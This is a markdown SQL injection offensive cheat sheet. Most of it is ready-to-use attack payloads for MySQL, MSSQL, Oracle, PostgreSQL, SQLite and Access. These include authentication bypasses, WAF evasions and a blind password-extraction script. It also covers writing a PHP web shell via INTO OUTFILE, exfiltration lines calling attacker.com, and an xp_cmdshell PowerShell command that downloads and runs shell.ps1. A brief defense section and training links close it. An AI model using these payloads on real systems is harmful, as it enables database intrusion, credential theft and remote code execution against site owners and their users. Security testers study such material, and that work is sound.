## 🎯 Overview & Theory

SQL Injection (SQLi) is a code injection attack where an attacker manipulates database queries by inserting untrusted data into application input fields. This vulnerability occurs when user-supplied input is insufficiently validated or sanitized before being used in SQL queries.

**Impact Scope:**

- **Data Breach:** Unauthorized access to sensitive database information
- **Authentication Bypass:** Circumventing login mechanisms
- **Data Manipulation:** Inserting, updating, or deleting database records
- **Privilege Escalation:** Gaining administrative access
- **Remote Code Execution:** Executing system commands (advanced scenarios)
- **Denial of Service:** Crashing database services

**Core Vulnerability Types:**

1. **In-Band SQLi** (Classic) - Results visible in application response
    - Error-based SQLi
    - Union-based SQLi
2. **Inferential SQLi** (Blind) - No direct output, infer results through behavior
    - Boolean-based Blind SQLi
    - Time-based Blind SQLi
3. **Out-of-Band SQLi** - Data exfiltration via alternate channels (DNS, HTTP)

---

## 🔍 Reconnaissance & Detection

### Phase 1: Input Vector Discovery

**Target Areas for Testing:**

- GET/POST parameters
- HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For)
- JSON/XML data fields
- File upload parameters
- WebSocket messages
- Hidden form fields

### Phase 2: Vulnerability Detection

**🚀 Quick Detection Payloads:**

```sql
# Basic Error Generation
'
"
`
')
")
';
";
'--
"--
' OR '1
' OR 1 -- -
" OR 1 = 1 -- -
' OR 'x'='x
' AND 1=2 UNION SELECT NULL -- -
```

**Behavioral Indicators:**

- Database error messages in response
- Different response times (time-based)
- Content changes based on true/false conditions
- Application crashes or unusual behavior

**🎯 Polyglot Detection Payload:**

```sql
'"<svg/onload=prompt(5);>{{7*7}}
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

**Database Fingerprinting:**

```sql
# MySQL
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()

# MSSQL
@@CONNECTIONS>0
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)

# Oracle
ROWNUM=ROWNUM
RAWTOHEX('AB')=RAWTOHEX('AB')

# PostgreSQL
5::int=5
pg_client_encoding()=pg_client_encoding()

# SQLite
sqlite_version()=sqlite_version()

# MS Access
cdbl(1)=cdbl(1)
```

---

## ⚡ Exploitation Methods

### Method 1: Error-Based Exploitation

**Objective:** Extract data through database error messages

**MySQL Example:**

```sql
' AND extractvalue(0x0a,concat(0x0a,(SELECT database()))) -- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- -
```

**MSSQL Example:**

```sql
' AND 1=CAST((SELECT @@version) AS INT) -- -
' AND 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) -- -
```

**PostgreSQL Example:**

```sql
' AND 1=CAST((SELECT version()) AS INT) -- -
```

---

### Method 2: UNION-Based Exploitation

**Step-by-Step Workflow:**

**Step 1: Determine Column Count**

```sql
# Using ORDER BY
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
# Continue until error occurs

# Using UNION SELECT with NULL
' UNION SELECT NULL -- -
' UNION SELECT NULL,NULL -- -
' UNION SELECT NULL,NULL,NULL -- -
```

**Step 2: Identify Injectable Columns**

```sql
# MySQL
' UNION SELECT 1,2,3,4 -- -

# PostgreSQL
' UNION SELECT NULL,NULL,NULL,NULL -- -
```

**Step 3: Extract Database Metadata**

**MySQL:**

```sql
# Database version
' UNION SELECT NULL,@@version,NULL -- -

# Current database
' UNION SELECT NULL,database(),NULL -- -

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata -- -

# List tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -

# List columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' -- -

# Extract data
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users -- -
```

**MSSQL:**

```sql
# Version
' UNION SELECT NULL,@@version,NULL -- -

# Database name
' UNION SELECT NULL,DB_NAME(),NULL -- -

# Tables
' UNION SELECT NULL,name,NULL FROM sys.tables -- -

# Columns
' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users') -- -
```

**Oracle:**

```sql
# Version
' UNION SELECT NULL,banner FROM v$version -- -

# Tables
' UNION SELECT NULL,table_name FROM all_tables -- -

# Columns
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS' -- -
```

**PostgreSQL:**

```sql
# Version
' UNION SELECT NULL,version() -- -

# Tables
' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public' -- -

# Columns
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' -- -
```

---

### Method 3: Boolean-Based Blind SQLi

**Exploitation Pattern:**

```sql
# Test if database name starts with 'a'
' AND SUBSTRING(database(),1,1)='a' -- -

# Extract password character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' -- -

# MySQL Length check
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10 -- -

# MSSQL
' AND LEN((SELECT password FROM users WHERE username='admin'))>10 -- -
```

**Automation Script Template:**

```python
import requests
import string

url = "http://target.com/page?id=1"
chars = string.ascii_letters + string.digits

password = ""
for position in range(1, 33):
    for char in chars:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}' -- -"
        r = requests.get(url + payload)
        if "Welcome" in r.text:  # Success indicator
            password += char
            print(f"[+] Found: {password}")
            break
```

---

### Method 4: Time-Based Blind SQLi

**Database-Specific Delays:**

```sql
# MySQL
' AND SLEEP(5) -- -
' AND (SELECT SLEEP(5) FROM users WHERE username='admin') -- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) -- -

# MSSQL
'; WAITFOR DELAY '0:0:5' -- -
'; IF (1=1) WAITFOR DELAY '0:0:5' -- -

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1 -- -
```

**🎯 Modern Robust Payloads:**

```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -
'; SELECT CASE WHEN (SUBSTRING(database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END -- -
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100,SLEEP(5),0) -- -
```

---

### Method 5: Stacked Queries (Advanced)

**MSSQL Unorthodox Stacking (WAF Bypass):**

```sql
# No semicolon required
SELECT 'a' SELECT 'b'

# Example exploitation
admin'exec('update[users]set[password]=''hacked''')--

# Enable xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

**PostgreSQL:**

```sql
'; DROP TABLE users -- -
'; CREATE TABLE inject(data text) -- -
```

---

### Method 6: Out-of-Band Data Exfiltration

**DNS Exfiltration (MySQL):**

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\test.txt')) -- -
```

**MSSQL (xp_dirtree):**

```sql
'; DECLARE @p varchar(1024); SET @p=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "//'+@p+'.attacker.com/a"') -- -
```

**Oracle (UTL_HTTP):**

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE username='admin')||'.attacker.com') FROM dual -- -
```

**PostgreSQL (COPY TO PROGRAM):**

```sql
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com?data=$(cat)' -- -
```

---

### Method 7: Second-Order SQL Injection

**Attack Flow:**

1. **Store malicious payload** in database (e.g., during registration)
2. **Trigger execution** when stored data is used in another query

**Example Scenario:**

```sql
# Registration phase - username field
username: admin' -- 

# Password reset query becomes:
UPDATE users SET password='newpass' WHERE username='admin' -- ' AND old_password='...'

# Result: Password reset without knowing old password
```

---

## 🛡️ Authentication Bypass

### Universal Bypass Payloads

**🚀 Top 10 Modern Robust Payloads:**

```sql
# 1. Classic OR bypass
admin' OR '1'='1' -- -

# 2. Always-true condition
admin' OR 1=1 -- -

# 3. Comment-based bypass
admin'--

# 4. Multi-context bypass
' OR 'x'='x

# 5. Union-based bypass with hash injection
admin' UNION SELECT 'admin','$2y$10$validbcrypthash' -- -

# 6. Boolean true with comment
' OR TRUE -- -

# 7. Parenthesis escape
admin') OR ('1'='1

# 8. Type juggling
admin' OR '1

# 9. Concatenation bypass
' OR ''='

# 10. Advanced logic bypass
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' -- -
```

### Raw Hash Magic Bytes

**Exploit MD5/SHA1 Type Juggling:**

```php
# When query uses: WHERE password=md5($input, true)
# MD5 raw output creates SQL injection

Password: ffifdyop
MD5 raw: 'or'6�]��!r,��b�
Query becomes: SELECT * FROM users WHERE pass=''or'6�]��!r,��b�'

Password: 3fDf 
SHA1 raw: Q�u'='�@�[�t�- o��_-!
```

---

## 🎭 WAF Bypass Techniques

### Bypass Strategy 1: Whitespace Alternatives

```sql
# Tab, Line Feed, Carriage Return, Form Feed
%09 (Tab)
%0A (LF)
%0B (Vertical Tab)
%0C (Form Feed)
%0D (CR)
%A0 (Non-breaking space)

# Examples
?id=1%09AND%091=1
?id=1%0AAND%0A1=1
```

### Bypass Strategy 2: Comment-Based Obfuscation

```sql
?id=1/**/UNION/**/SELECT/**/NULL,@@version/**/--+-
?id=1/*!12345UNION*//*!12345SELECT*/1,2
```

### Bypass Strategy 3: Case Manipulation

```sql
?id=1 UnIoN SeLeCt 1,2,3
?id=1 uNiOn aLl sElEcT 1,2,3
```

### Bypass Strategy 4: Encoding Techniques

```sql
# URL Encoding
?id=1%20UNION%20SELECT%201,2,3

# Double URL Encoding
?id=1%2520UNION%2520SELECT

# Unicode Encoding
?id=1%u0055NION%u0053ELECT

# Hex Encoding
?id=0x1 UNION SELECT 0x61646D696E
```

### Bypass Strategy 5: Logical Operator Replacement

```sql
# Replace AND with &&
?id=1' && '1'='1

# Replace OR with ||
?id=1' || '1'='1

# Replace = with LIKE
?id=1' AND username LIKE 'admin

# Replace = with REGEXP
?id=1' AND username REGEXP '^admin
```

### Bypass Strategy 6: Function Alternatives

```sql
# Instead of SUBSTRING
MID(), SUBSTR(), LEFT(), RIGHT()

# Instead of CONCAT
CONCAT_WS(), GROUP_CONCAT()

# Instead of UNION
UNION ALL, UNION DISTINCT
```

### Bypass Strategy 7: Scientific/Hex Notation

```sql
?id=0eUNION SELECT 1,2,3
?id=0xUNION SELECT 1,2,3
```

### Bypass Strategy 8: NULL Byte Injection

```sql
%00' UNION SELECT password FROM users WHERE username='admin'--
```

---

## 🔥 Advanced Exploitation Techniques

### File Operations

**MySQL File Read:**

```sql
' UNION SELECT LOAD_FILE('/etc/passwd') -- -
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764) -- -
```

**MySQL File Write:**

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -
' UNION SELECT 0x3c3f... INTO DUMPFILE '/tmp/shell.php' -- -
```

**MSSQL File Operations:**

```sql
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute commands
'; EXEC xp_cmdshell 'whoami' -- -
```

**PostgreSQL Large Object Upload:**

```sql
# Create large object
SELECT lo_creat(-1);

# Insert data chunks (2KB each)
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('BASE64_CHUNK', 'base64'));

# Export file
SELECT lo_export(173454, '/tmp/shell.php');
```

---

### SSRF via SQL Injection

**MySQL UDF Approach:**

```sql
# Create UDF for HTTP requests
CREATE FUNCTION http RETURNS STRING SONAME 'lib_mysqludf_http.so';
SELECT http('http://169.254.169.254/latest/meta-data/');
```

**MSSQL SSRF:**

```sql
# xp_dirtree (Limited to port 445)
EXEC master..xp_dirtree '\\attacker.com\share';

# xp_fileexist
EXEC master..xp_fileexist '\\attacker.com\share';
```

**Oracle SSRF:**

```sql
# UTL_HTTP
SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/') FROM dual;

# UTL_INADDR (DNS-based)
SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual;
```

**PostgreSQL SSRF:**

```sql
# dblink extension
SELECT dblink_connect('host=attacker.com');
```

---

### Active Directory Enumeration (MSSQL)

```sql
# Get current domain
SELECT DEFAULT_DOMAIN();

# Get domain SID
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'));

# Enumerate users by ID
SELECT SUSER_SNAME(0x01050000000000051500000...0000e803);
```

---

### INSERT/UPDATE Exploitation

**ON DUPLICATE KEY UPDATE (MySQL):**

```sql
# Change admin password during registration
email: attacker@test.com", "hash"), ("admin@test.com", "newhash") ON DUPLICATE KEY UPDATE password="newhash" -- -
```

---

## 🤖 Automated Exploitation with SQLMap

### Basic Usage

```bash
# Simple GET parameter
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# POST request from file
sqlmap -r request.txt --batch --level=5 --risk=3

# Full automation with forms
sqlmap -u "http://target.com/" --crawl=3 --forms --batch --threads=5
```

### Advanced Options

```bash
# Specify injection point
sqlmap -u "http://target.com/page?id=1*" --batch

# Custom injection in headers
sqlmap -u "http://target.com/" --headers="X-Forwarded-For:127.0.0.1*" --batch

# Second-order injection
sqlmap -r login.txt -p username --second-req details.txt

# With Tor
sqlmap -u "http://target.com/" --tor --tor-type=SOCKS5 --check-tor

# WAF bypass with tampers
sqlmap -u "http://target.com/" --tamper=space2comment,between --random-agent
```

### Custom Tamper Script (Second-Order Example)

```python
#!/usr/bin/env python
import requests
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def register_payload(payload):
    proxies = {'http':'http://127.0.0.1:8080'}
    cookies = {"SESSION": "token"}
    
    data = {"username":"test", "email":payload, "password":"pass123"}
    requests.post("http://target.com/register", data=data, cookies=cookies, proxies=proxies)
    
    # Logout to trigger second-order
    requests.get("http://target.com/logout", cookies=cookies, proxies=proxies)

def tamper(payload, **kwargs):
    register_payload(payload)
    return payload
```

### Tamper Scripts for WAF Bypass

**🚀 Top 10 Essential Tampers:**

1. **space2comment** - Replace spaces with comments
2. **between** - Replace `>` with `NOT BETWEEN 0 AND`
3. **charencode** - URL-encode all characters
4. **randomcase** - Random uppercase/lowercase
5. **versionedkeywords** - MySQL versioned comments
6. **apostrophemask** - Replace `'` with UTF-8 equivalent
7. **equaltolike** - Replace `=` with `LIKE`
8. **greatest** - Replace `>` with `GREATEST`
9. **ifnull2ifisnull** - Replace IFNULL with IF(ISNULL())
10. **space2morehash** - Replace space with `#` and newline

**Usage:**

```bash
sqlmap -u "http://target.com/" --tamper=space2comment,between,randomcase
```

---

## 📊 Database-Specific Cheat Sheets

### MySQL

```sql
# Version
SELECT @@version;
SELECT VERSION();

# Current user
SELECT USER();
SELECT CURRENT_USER();

# Database name
SELECT DATABASE();

# List databases
SELECT schema_name FROM information_schema.schemata;

# List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read file
SELECT LOAD_FILE('/etc/passwd');

# Write file
SELECT 'shell' INTO OUTFILE '/tmp/shell.php';

# Time delay
SELECT SLEEP(5);
SELECT BENCHMARK(10000000,MD5('A'));

# String concatenation
CONCAT('a','b')
CONCAT_WS(':','a','b')
```

### MSSQL

```sql
# Version
SELECT @@VERSION;

# Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

# Database name
SELECT DB_NAME();

# List databases
SELECT name FROM sys.databases;

# List tables
SELECT name FROM sys.tables;

# List columns
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');

# Execute commands (requires xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami';

# Time delay
WAITFOR DELAY '0:0:5';

# String concatenation
'a'+'b'
CONCAT('a','b')
```

### PostgreSQL

```sql
# Version
SELECT version();

# Current user
SELECT current_user;

# Database name
SELECT current_database();

# List databases
SELECT datname FROM pg_database;

# List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read file
SELECT pg_read_file('/etc/passwd');

# Time delay
SELECT pg_sleep(5);

# String concatenation
'a'||'b'
CONCAT('a','b')
```

### Oracle

```sql
# Version
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';

# Current user
SELECT user FROM dual;

# Database name
SELECT ora_database_name FROM dual;

# List tables
SELECT table_name FROM all_tables;

# List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

# Time delay
SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual;

# String concatenation
'a'||'b'
CONCAT('a','b')
```

### SQLite

```sql
# Version
SELECT sqlite_version();

# List tables
SELECT name FROM sqlite_master WHERE type='table';

# List columns
PRAGMA table_info(users);

# Time delay
SELECT RANDOMBLOB(100000000);

# String concatenation
'a'||'b'
```

### MS Access

```sql
# Version
SELECT @@version; # Doesn't work - no version function

# List tables
SELECT MSysObjects.name FROM MSysObjects WHERE MSysObjects.type=1;

# String concatenation
'a'&'b'
'a'+'b'

# Comments
-- Not supported, use NULL byte instead
' UNION SELECT 1,2,3%00

# Time delay via UNC path
' UNION SELECT 1 FROM sometable IN '\\10.10.14.3\slow\db.mdb'--

# Substring
MID('string',1,3)

# Boolean true
IIF(1=1,TRUE,FALSE)
```

---

## 💥 Higher Impact Scenarios

### Scenario 1: Authentication Bypass → Admin Access

**Attack Chain:**

1. Bypass login with: `admin' OR '1'='1' -- -`
2. Access admin panel
3. Upload webshell via file upload
4. Gain RCE

### Scenario 2: SQLi → File Read → Source Code Disclosure

**Attack Chain:**

1. Identify file read capability: `' UNION SELECT LOAD_FILE('/etc/passwd') -- -`
2. Read application config: `' UNION SELECT LOAD_FILE('/var/www/html/config.php') -- -`
3. Extract database credentials
4. Direct database access

### Scenario 3: Blind SQLi → Full Database Dump

**Attack Chain:**

1. Confirm time-based SQLi: `' AND SLEEP(5) -- -`
2. Automate extraction with custom script
3. Extract all databases, tables, columns
4. Dump sensitive data (credentials, PII)

### Scenario 4: SQLi → SSRF → AWS Metadata

**Attack Chain (MSSQL):**

```sql
# Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -

# SSRF to AWS metadata
'; EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' -- -
```

### Scenario 5: SQLi → OS Command Execution

**MySQL (UDF):**

```sql
# Upload malicious UDF library
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# Create function
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';

# Execute command
SELECT sys_exec('id > /tmp/output.txt');
```

**MSSQL (xp_cmdshell):**

```sql
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"' -- -
```

### Scenario 6: Second-Order SQLi → Account Takeover

**Attack Flow:**

1. Register with username: `admin' --`
2. Trigger password reset function
3. Query becomes: `UPDATE users SET password='new' WHERE username='admin' -- '`
4. Admin password changed without authorization

---

## 🛡️ Defense & Mitigation

### Secure Coding Practices

**1. Parameterized Queries (Prepared Statements)**

**PHP (PDO):**

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
```

**Python (SQLAlchemy):**

```python
result = db.session.execute(
    text("SELECT * FROM users WHERE username = :user"),
    {"user": username}
)
```

**Java (JDBC):**

```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
```

**2. Input Validation**

- Whitelist allowed characters
- Validate data types
- Enforce length restrictions
- Use regex patterns for expected formats

**3. Least Privilege Principle**

- Database accounts should have minimal required permissions
- Separate read-only and write accounts
- Disable dangerous functions (xp_cmdshell, LOAD_FILE, etc.)

**4. Web Application Firewall (WAF)**

- Deploy ModSecurity or cloud WAF
- Create custom rules for SQL injection patterns
- Monitor and block malicious requests

**5. Error Handling**

- Never display detailed database errors to users
- Log errors server-side only
- Use generic error messages

**6. Stored Procedures (with caution)**

```sql
CREATE PROCEDURE GetUser(IN userId INT)
BEGIN
    SELECT * FROM users WHERE id = userId;
END;
```

**7. ORM Frameworks**

- Use Django ORM, Hibernate, Entity Framework
- Avoid raw SQL queries
- Validate ORM inputs as well

---

## 🎓 Practice Resources

**Legal Training Platforms:**

- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- DVWA (Damn Vulnerable Web Application)
- SQLi-Labs
- Mutillidae

**Reference Materials:**

- OWASP SQL Injection Guide
- PortSwigger SQL Injection Cheat Sheet
- PentestMonkey SQL Injection Cheat Sheets
- PayloadsAllTheThings - SQL Injection

---

## 🚀 Quick Reference: Testing Checklist

**✅ Phase 1: Reconnaissance**

- [ ] Map all input vectors
- [ ] Identify database technology
- [ ] Test error generation with special characters

**✅ Phase 2: Detection**

- [ ] Test boolean-based detection
- [ ] Test time-based detection
- [ ] Confirm vulnerability with multiple payloads

**✅ Phase 3: Exploitation**

- [ ] Determine column count (ORDER BY / UNION)
- [ ] Identify injectable columns
- [ ] Extract database version
- [ ] Enumerate databases
- [ ] Enumerate tables
- [ ] Enumerate columns
- [ ] Extract sensitive data

**✅ Phase 4: Advanced Techniques**

- [ ] Test file read/write capabilities
- [ ] Check for SSRF opportunities
- [ ] Test OS command execution
- [ ] Explore second-order injection

**✅ Phase 5: Documentation**

- [ ] Document all findings
- [ ] Create proof-of-concept
- [ ] Assess business impact
- [ ] Provide remediation guidance

---

## 🔥 Motivation Boost

**Remember:** Every SQLi vulnerability you discover makes the web more secure! Each test is a learning opportunity. Break down complex exploitation into smaller steps, celebrate each successful extraction, and never stop learning new bypass techniques. The database is your playground—explore it systematically! 🚀

**Mental Hack:** Treat SQL injection like solving a logic puzzle. Each query is a conversation with the database. Listen to its responses (errors, timing, content changes) and adjust your approach. Persistence wins! 💪